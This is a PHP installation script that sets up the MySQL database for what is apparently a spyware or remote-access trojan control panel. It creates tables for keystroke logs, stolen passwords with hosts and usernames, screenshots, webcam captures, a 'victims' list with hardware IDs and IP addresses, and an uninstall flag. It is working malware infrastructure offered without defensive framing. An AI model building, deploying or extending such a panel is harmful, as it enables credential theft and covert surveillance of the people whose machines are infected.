<?php
	require('config.php');

	$conn = new mysqli($mysql_host, $mysql_user, $mysql_password);
	$conn->select_db($mysql_database);
	
	if ($conn->connect_error) {
		die("Connection failed: " . $conn->connect_error);
	}

	$sqlk = 'CREATE TABLE if not exists logs (log_id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY, hwid VARCHAR(50) NOT NULL, pc_name VARCHAR(45) NOT NULL, time DATETIME NOT NULL, log MEDIUMTEXT NOT NULL, ip_addres VARCHAR(20), server_time DATETIME, status TINYINT) ENGINE=MyISAM DEFAULT CHARSET=utf8';
	$sqlp = 'CREATE TABLE if not exists passwords (password_id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY, hwid VARCHAR(50) NOT NULL, pc_name VARCHAR(45) NOT NULL, client VARCHAR(100) NOT NULL, host VARCHAR(100) NOT NULL, username VARCHAR(100) NOT NULL, pwd VARCHAR(100) NOT NULL, time DATETIME, server_time DATETIME, status TINYINT)';
	$sqls = 'CREATE TABLE if not exists screens(screen_id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY, hwid VARCHAR(50) NOT NULL, pc_name VARCHAR(45) NOT NULL, time DATETIME NOT NULL, screen VARCHAR(100) NOT NULL, server_time DATETIME, status TINYINT)';
	$sqln = 'CREATE TABLE if not exists victims (id INT AUTO_INCREMENT PRIMARY KEY, hwid VARCHAR(50), pc_name VARCHAR(45) NOT NULL, ip_addres VARCHAR(20),  add_date DATETIME NOT NULL,  time DATETIME NOT NULL, server_time DATETIME, status TINYINT) ENGINE=MyISAM DEFAULT CHARSET=utf8';
	$sqlw = 'CREATE TABLE if not exists webcam(screen_id INT UNSIGNED AUTO_INCREMENT PRIMARY KEY, hwid VARCHAR(50) NOT NULL, pc_name VARCHAR(45) NOT NULL, time DATETIME NOT NULL, screen VARCHAR(100) NOT NULL, server_time DATETIME, status TINYINT)';
	$sqlu = 'CREATE TABLE if not exists uninstall(hwid VARCHAR(50) NOT NULL, status TINYINT)';
		
	if (($conn->query($sqlk) === TRUE) and
	($conn->query($sqlp) === TRUE) and
	($conn->query($sqls) === TRUE) and
	($conn->query($sqln) === TRUE) and
	($conn->query($sqlw) === TRUE) and
	($conn->query($sqlu) === TRUE)) {
	}
	else
	{
		echo $conn->error;
	}
	
	$sql_add_date_column = 'select add_date from victims';
	if($conn->query($sql_add_date_column) === FALSE){
		$sql_add_column = 'alter table victims add column add_date DATETIME DEFAULT 0 NOT NULL';
		$conn->query($sql_add_column);
	}
	$sql_add_date_column = 'select id from victims';
	if($conn->query($sql_add_date_column) === FALSE){
		$sql_add_column = 'ALTER TABLE victims DROP PRIMARY KEY';
		$conn->query($sql_add_column);
		$sql_add_column = 'alter table victims add column id INT AUTO_INCREMENT PRIMARY KEY';
		$conn->query($sql_add_column);
	}
	$conn->close();
?>